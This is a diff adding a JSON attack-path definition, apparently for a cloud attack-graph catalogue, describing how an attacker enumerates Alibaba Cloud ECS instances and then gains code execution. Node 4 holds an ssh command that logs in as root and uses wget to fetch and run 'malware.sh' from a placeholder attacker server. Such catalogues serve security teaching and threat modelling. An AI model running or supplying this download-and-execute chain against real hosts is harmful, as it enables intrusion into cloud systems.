@@ -1,0 +1,59 @@
+{
+    "title": "Exploit ECS Misconfiguration for Remote Code Execution",
+    "icon": "https://img.icons8.com/?size=100&id=44471&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List ECS Instances",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "aliyun ecs DescribeInstances",
+                "description": "Lists all ECS instances in the specified region.",
+                "services": ["ECS"],
+                "attack_types": ["Enumeration"],
+                "references": "https://www.alibabacloud.com/help/doc-detail/25506.htm"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Describe ECS Instance",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/describe.png",
+            "details": {
+                "command": "aliyun ecs DescribeInstanceAttribute --InstanceId <instanceId>",
+                "description": "Describes the specified ECS instance to find misconfigurations.",
+                "services": ["ECS"],
+                "attack_types": ["Enumeration"],
+                "references": "https://www.alibabacloud.com/help/doc-detail/25507.htm"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Exploit Misconfiguration",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/exploit.png",
+            "details": {
+                "command": "ssh -i <privateKeyFile> root@<publicIpAddress> 'wget http://<attacker-server>/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh'",
+                "description": "Uses SSH access with a private key to connect to the ECS instance, download a malicious script, and execute it.",
+                "services": ["ECS"],
+                "attack_types": ["Remote Code Execution"],
+                "references": "https://example.com/real-life-exploit-example"
+            }
+        },
+        {
+            "id": 5,
+            "label": "Analyze Execution Results",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/analysis.png",
+            "details": {
+                "command": "Review logs and output for execution results",
+                "description": "Analyzes the results of the executed code on the ECS instance.",
+                "services": ["ECS"],
+                "attack_types": ["Remote Code Execution"]
+            }
+        }
+    ]
+}
